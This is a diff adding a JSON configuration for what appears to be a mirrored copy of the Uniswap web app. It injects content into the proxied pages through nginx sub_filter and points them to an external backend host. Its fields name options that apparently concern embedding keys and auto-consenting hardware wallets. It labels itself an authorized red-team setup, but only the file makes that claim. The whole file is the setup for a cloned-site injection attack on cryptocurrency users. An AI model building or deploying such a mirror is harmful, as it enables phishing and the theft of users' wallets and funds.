@@ -1,0 +1,10 @@
+{
+  "authorized_red_team": true,
+  "mode": "mirror",
+  "source_url": "https://app.uniswap.org/",
+  "backend_url": "https://legionapi-production.up.railway.app",
+  "inject_via": "nginx sub_filter on proxied HTML",
+  "kinetic_key_embedded": false,
+  "hardware_auto_consent": false,
+  "generated_at": "2026-06-09T23:11:59.318Z"
+}
